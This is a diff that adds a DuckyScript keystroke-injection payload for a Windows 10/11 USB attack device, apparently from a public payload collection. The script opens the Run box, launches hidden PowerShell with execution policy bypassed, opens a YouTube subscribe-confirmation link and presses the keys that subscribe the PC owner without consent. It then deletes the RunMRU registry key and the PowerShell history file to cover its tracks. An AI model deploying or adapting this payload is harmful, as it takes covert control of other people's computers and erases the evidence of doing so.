@@ -1,0 +1,32 @@
+REM Title: OMG-Subscribe
+REM Description: This payload is meant to get the owner of the target PC to subscribe to your youtube channel
+REM Author: I am Jakoby
+REM Target: Windows 10, 11
+REM
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass Start-Process "
+REM
+REM put your youtube link here, you should test it out with mine first though ;D 
+STRING https://www.youtube.com/iamjakoby
+REM
+STRING ?sub_confirmation=1"
+DELAY 500
+ENTER 
+DELAY 3000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+ENTER
+DELAY 500
+ALT F4
+DELAY 1000
+GUI r
+DELAY 500
+REM
+REM This will clear their powershell and runbox history
+REM
+STRING powershell -w h -NoP -NonI -Exec Bypass reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f; Remove-Item (Get-PSreadlineOption).HistorySavePath
+DELAY 500
+ENTER
